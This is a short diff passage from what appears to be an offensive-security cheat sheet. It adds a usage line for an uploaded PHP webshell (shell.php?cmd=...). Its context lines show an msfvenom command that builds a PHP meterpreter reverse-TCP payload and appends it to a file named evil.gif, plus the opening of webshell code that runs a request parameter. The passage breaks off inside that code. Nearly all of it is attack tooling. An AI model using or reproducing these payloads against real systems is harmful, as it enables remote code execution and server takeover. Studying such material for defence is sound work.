@@ -490,6 +490,7 @@ or
 	> msfvenom -p php/meterpreter/reverse_tcp lhost='ip' lport='port' >> evil.gif´
 
 #### simple php webshell [php]
+- post upload usage: http://'hostip'/path/to/shell.php?cmd='cmd'
 ```
 	<?php if(isset($_REQUEST['cmd'])){
         echo "<pre>";
